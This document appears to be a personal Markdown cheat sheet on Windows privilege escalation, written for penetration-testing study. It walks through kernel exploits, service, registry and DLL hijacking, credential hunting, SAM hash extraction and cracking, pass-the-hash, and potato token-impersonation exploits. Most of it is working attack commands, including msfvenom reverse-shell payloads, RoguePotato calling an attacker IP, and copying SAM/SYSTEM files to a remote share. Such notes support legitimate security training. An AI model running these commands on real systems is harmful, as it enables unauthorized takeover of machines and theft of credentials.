# kernel exploits
systeminfo -> use tools/google results
eg with windows7:
```
*windows - save systeminfo output and redirect to local machine*
> systeminfo > \\my.ip.here\directory\systeminfo.txt
```
*local machine - run windows exploit suggester*
```
# python3 wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits only | less
```
cross reference output with known binaries (eg grep for CVE and search secwiki link below for list)

if match is found simply DL precompiled binary, setup listener, run binary against reverse shell (any program can be specified )
```
> .\cve-whatever.exe C:\reverse.exe
```
### tools
windows exploit suggester
https://github.com/bitsadmin/wesng

precompiled kernel exploits
https://github.com/SecWiki/windows-kernel-exploits

watson (for more recent version of windows)
https://github.com/rasta-mouse/Watson

# service exploits
#### service command cheat sheet
query config of service
```
> sc.exe qc <name>
```
query current status of service
```
> sc.exe query <name>
```
modify config option of a service
```
> sc.exe config <name> <option>= <value>
```
start/stop service
```
> net start/stop <name>
```
#### insecure service permissions
if user has permission to change config of a service which runs with SYSTEM privileges that user can change the executable the service uses to one of our own.

**potential rabbit hole** if user can change service but cannot start/stop the service it may be unable to escalate privileges (it may be possible to restart machine to restart services)

```
> winpeas.exe quiet servicesinfo
```
check output with accesscheck if needed (omit 'w' if write not needed)
```
> .\accesschk.exe /accepteula -uwcqv CURRENT_USER SERVICE_NAME
```
sc to get current config/dependencies
```
> sc qc SERVICE_NAME
```
sc to get current status
```
> sc query SERVICE_NAME
```
sc to change binary path to reverse shell
```
> sc config SERVICE_NAME binpath= '\path\to\reverse\shell.exe'
```
restart/start service as needed
```
> net start SERVICE_NAME
```

#### unquoted service paths
if winpeas spots unquoted service path first check start/stop permissions
```
> .\accesschk.exe /accepteula -ucqv CURRENT_USER SERVICE_NAME
```
check for write permissions on directoy in current binary path
```
> .\accesschk.exe /accepteula -uwdq C:\ # continue with other directories in path
```
copy reverse_shell.exe to directory with write permissions and rename as first first of the next directory
```
> copy reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
```
#### weak registry permissions
verify permissions (PS or accesschk)
```
PS > Get-Acl HKLM:\SYSTEM\CurrentControlSet\Services\SERVICE_NAME\ | Format-List
```
or
```
> .\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
```
check if can start service
```
> .\accesschk.exe /accepteula -uwcqv USER SERVICE_NAME
```
check current values in service registry entry
```
> reg query HKLM\SYSTEM\CurrentControlSet\services\SERVICE_NAME
```
modify ImagePath to point to reverse shell
```
> reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PATH\TO\REVERSE\SHELL.EXE /f
```
#### insecure service executable
**MAKE BACKUP OF ORIGINAL EXECUTABLE**
```
> copy "C:\Program Files\File Permissions Service\filepermservice.exe" C:\Temp
```
overwrite original executable with reverse shell
```
> copy /Y "C:\PrivEsc\reverse.exe" "C:\Program Files\File Permissions Service\filepermservice.exe" 
```
#### DLL hijacking
check if ou can start and stop service
```
> .\accesschk.exe -uvqc USER_NAME SERVICE_NAME
```
confirm binary path/priveledges 
```
> sc qc SERVICE_NAME
```
**COPY FILE TO MACHINE WITH ADMIN PRIV TO USE PROCMON**
##### procmon
- run with admin priv
- stop capture/clear list
- ctrl+L to open filter list
- add process name filter to match exe found in scan
- unselect registry and network activity
- restart capture
- searching for "NAME NOT FOUND"
- generate reverse shell ass DLL with msfvenom
```
# msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f dll - missing_dll.dll
```
place generated dll and restart service

# registry exploits
#### autorun
windows can be configured to autorun programs on startup
if you are able to write an autorun exe and are able to restart the machine, or wait for a restart, you may be able to escalate privileges

winpeas for applications
```
> .\winpeas.exe quiet applicationsinfo
```
check autorun with reg query
```
> reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```
then use accesschk on each exe to check permissions
```
> .\accesschk.exe /accepteula -wvu "C:\Path\to\exe"
```
overwirte program.exe file (make a backup) then restart system
```
> copy "C:\path\to\file.exe" C:\Temp
> copy /Y reverse_shell.exe "C:\path\to\file.exe"
```
setup listener/restart system
*NOTE: on windows 10 this may cause the shell to spawn with privilegdes based off **last logged in user**

#### AlwaysInstallElevated
MSI (microsoft installer files) normall run under permissions of user but windows allows elevated priviledges

winpeas to scan priviledges and AlwaysInstallElevated
```
> winpeas.exe quiet systeminfo
```
verify manually
```
> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
create shell and install shell (start listener before install)
```
# msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f msi -o reverse.msi

> msiexec /quiet /qn /i reverse.msi
```


# passwords
#### registry
some programs store windows in registry, windows itself will sometimes do this
##### worst case
commands to search registry for string "password"

local machine:
```
> reg query HKLM /f password /t REG_SZ /s
```

current user:
```
> reg query HKCU /f password /t REG_SZ /s
```
##### best case
winpeas finds useful passwords when doing filesinfo/userinfo
```
> .\winPeas.exe quiet filesinfo userinfo
```

if passwords are found can confirm with reg query
autologin example:
```
> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
    DefaultUsername    REG_SZ    admin
    DefaultPassword    REG_SZ    password123
```

#### saved creds
windows has 'runas' which allows users to run commands with privileges of other users. usually requires knowledge of the other user's password, but windows does allow users to save their credentials to the system and these saved creds can be used to bypass

run winpeas to enumerate possible saved credentials
```
> .\winpeas.exe quiet cmd windowscreds
```
cmdkey command to list all saved creds
```
> cmdkey /list
```
if saved cred found, use runas to run reverse shell as admin
```
> runas /savedcred /user:admin "C:\Path\To\Reverse\Shell.exe"
```

#### config files
config files can contain creds, unattend.xml is an example of this. some useful commands to manually enumerate config files

recursively search for files in current directory with "pass" in the *name* or ending in ".config"
```
> dir /s *pass* == *.config
```
recursively search for files in current directory that *conntain* the word password and also end in .xml, .ini, or .txt
```
> findstr /si password *.xml *.ini *.txt
```
always check unattend.xml
```
> type C:\path\to\unattend.xml
# echo "random_string" | base64 -d
```

#### SAM 
windows stores password hashes in the Security Account Manager
the passwords are encrypted with a key which can be found in a file named SYSTEM
if you can read both SAM and SYSTEM you can extract hashes
these files are located in System32\config but are locked 
backups may exist in System32\config\RegBack
if files exist (found with winpeas) copy to local machine
```
> copy C:\path\to\SAM/SYSTEM \\IP.HERE
```
and run pwdump to extract hashes
```
# python2 pwdump.py SYSTEM SAM
```
output example with notation:
```
USERNAME:SID:LM HASH(deprecated,empty string): NTLM HASH
user:1003:aad3b435b51404eeaad3b435b51404ee:91ef1073f6ae95f5ea6ace91c09a963a:::
admin:1004:aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da:::
```
NTLM hash starting with 31d6 indicates no password or disabled account
crack with hashcat
```
# hashcat -m 1000 -force COPIEDADMINHASH /path/to/wordlist.txt
```

##### pass the hash
windows accepts hashes 
```
# ./psexec.py DOMAIN/USER@IP -hashes LM_HASH:NTLM_HASH
# ./psexec.py admin@192.168.0.205 -hashes aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da
```

# scheduled tasks
enumerating tasks is very manual
list all tasks
```
> schtasks /query /fo LIST /v

PS> Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```
often need to rely on other clues, scripts or log files which indicate scheduled tasks. if script is found edit to point to reverse shell backup script first.

# inescure gui apps
in older versions of windows users could be allowed to run GUI apps with admin priviledges
checking if program is running under admin priv
```
>tasklist /V | findstr PROGRAM_NAME.exe
```
can be used to spawn admin cmd
File -> Open -> "file://c:/windows/system32/cmd.exe"
another example: "Windows Help and Support" (Windows + F1), search for "command prompt", click on "Click to open Command Prompt"

# startup apps
windows dir for startup apps for all users
"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
if we can create files in this directory we can place a reverse shell which will execute when the admin logs in.
check directory with accesschk
```
> .\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
```
files in directory must be shortcuts (link files)
use VBScript to create shortcut
```vbs
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "C:\PATH\TO\REVERSE.exe"
oLink.Save
```
run using cscript
```
> cscript VBSCRIP_NAME.vbs
```
wait for admin to login while listener is running

# installed apps
generally, vulnerabilities in installed apps could be placed into one of the previous covered categories
can use seatbelt to search for non-standard processes
```
> .\seatbelt.exe NonStandardProcesses
```
or winpeas
```
> .\winpeas.exe processinfo (procesinfo if using older verison)
```

# hot potato
NTLM relay attack, works on windows 7, 8, early 10 (patched in windows 10)
```
> .\potato.exe -ip VICTIM.IP.HERE -cmd "C:\PATH\TO\REVERSE.EXE" -enable_http_server true -enable_defender true -enable_spoof true -enable_exhaust true
```

# token impersination
despite service accounts not being able to log in directly, there are still paths to escalate privileges
- rotten potato: service accounts could intercept a SYSTEM ticket and use it to impersonate SYSTEM user (SeImpersonatePrivilege enabled)
- SeImpersonate/SeAssignPrimaryToken: service accounts are typically configured with these two privileges. they allow the account to impersonate the access tokens of other users (including SYSTEM). any user with these privileges can run the token impersonation exploits.
- juicy potato: expanded on rotten, works in the same way. 
#### juicy potato
check privs of account
```
> whoami /priv
```
if SeImpersonate and SeAssignPrimaryToken:
check CLSID list
https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md
```
> .\JuicyPotato.exe -l PORT_NOT_IN_USE -p C:\PATH\TO\REVERSE.EXE -t * -c {lookup CLSID for windows version}
```

#### rogue potato
latest potato exploit, more info found on github.
the example below is a proof of concept, in a real engagement you would use this method when you obtain a service shell or a shell with a user who has SeImpersonate or SeAssignToken.
**POC example**:
- setup socat to redirect traffic from port 135 to 9999 on windows VM
```
# sudo socat tcp-listen:135,reuseaddr,fork tcp:WINDOWS.IP:9999
```
- setup listener on port of choice for reverse shell
- spawn a service shell **for POC test**
```
> .\PsExec64.exe /accepteula -i -u "nt authority\local service" C:\PATH\TO\REVERSE.EXE
```
- **run rogue potato**
```
> .\RoguePotato.exe -r ATTACKER.IP.HERE -l 9999 -e "C:\PATH\TO\REVERSE.EXE"
```
if things went right you should get a reverse shell as nt authority\\***system***

#### PrintSpoofer
exploit targeting print spooler service with token impersonation
does not need port forwarding, entire exploit happens on target machine
like rogue potato, you would use this method when you obtain a service shell or a shell with a user who has SeImpersonate or SeAssignToken.
requires visual c++ redist is installed
**POC example**:
```
> .\PrintSpoofer.exe -i -c C:\PATH\TO\REVERSE.EXE
```

# port forwarding
sometimes it is easier to run exploit code on local machine while the vulnerable program is listening on an internal port
in cases like these we need to forward the port to the internal port on windows
**plink example**:
```
> .\pling.exe local_username@local.ip -R (tells plink to forward remote port to local port) 445(port we are forwarding on local machine):127.0.0.1(localip of windows machine):445(port we want to forward to)

> .\plink.exe dials@192.168.0.229 -R 445:127.0.0.1:445
```
- modify winex.exe to point to localhost
```
# winexe -U 'admin%password123' //127.0.0.1 cmd.exe
```
*** UNABLE TO TEST WINEXE NEED KALI BOX ***

# privesc strategy
#### enumeration
- check user and groups (whoami and net user USERNAME)
- run winPEAS with fast, searchfast, cmd options
- run seatbelt and other enumeration scripts
- if scripts are failing then use manual commands (cheat sheets, payloadsallthethings, etc).

#### strategy
- take some time to read over entire results
- make note of any interesting finds in winpeas/other scripts
- avoid rabbit holes by creating a checklist of all required setup for each privilege escalation method found 
	- eg. you find an insecure service permission but are unable to start/stop the service
- look through user's desktop and other common locations for interesting files
- read through any interesting files found
- try low effort steps first (reg exploits, services, etc)
- take a good look at admin processes and enumerate versions then search for exploits
- check for internal ports which may be available to forward
- if still stuck re-read ful enumeration output and highlight anything that seems odd (anything from unknown processes to interesting usernames)
- at this point you can start to investigate kernel exploits
	
# getsystem
#### access tokens
special objects in windows which store a users identity and privileges
**Primary Access Token**: created when user logs in, bound to current user sessions. when a user starts a new process their primary access token is copied and attached to the new process

**Impersonation Access Token**: created when a process or thread needs to temporarily run with the security context of another user

#### token duplication
windows allows process/threads to duplicate their access tokens
an impersonation access otken can be duplicated into a primary access token in this wway
if we can inject into a process we can use this functionality to duplicate the access token of the process and spawn a separate process with the same privileges

#### named pipes
a named pipe is an extension of command line piping
a process can create a named pipe and other processes can open the named pipe to read/write data from it
the process which created the named pipe can impersonate the security context of a process which connects to the named pipe

#### getsystem
getsystem command in metasploit
src
https://github.com/rapid7/metasploit-payloads/tree/master/c/meterpreter/source/extensions/priv
files of note: elevate.c, namedpipe.x, and tokendup.c

# user privileges
